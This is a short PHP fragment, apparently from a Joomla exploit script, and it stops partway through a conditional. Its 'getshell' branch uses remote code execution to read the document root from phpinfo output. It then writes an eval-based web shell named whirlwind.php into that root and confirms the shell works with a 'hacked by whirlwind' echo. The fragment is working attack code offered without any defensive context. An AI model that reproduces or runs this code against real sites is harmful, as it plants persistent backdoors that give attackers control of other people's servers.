...
switch ($method) {
case 'getshell':
	// get web dir from phpinfo
	$info = hackjoomla($url, 'phpinfo();');
	preg_match("/DOCUMENT_ROOT(.*)</", $info, $info);
	preg_match("/\">(.*)</", $info[1], $info);
	//webshell code
	$shell = '<?php eval($_REQUEST[whirlwind]);?>';
	$getshellcommand = "file_put_contents('" . $info[1] . "/whirlwind.php', '$shell');";
	hackjoomla($url, $getshellcommand);
	if (file_get_contents($url . '/whirlwind.php?whirlwind=echo+("hacked+by+whirlwind");') == "hacked by whirlwind") {
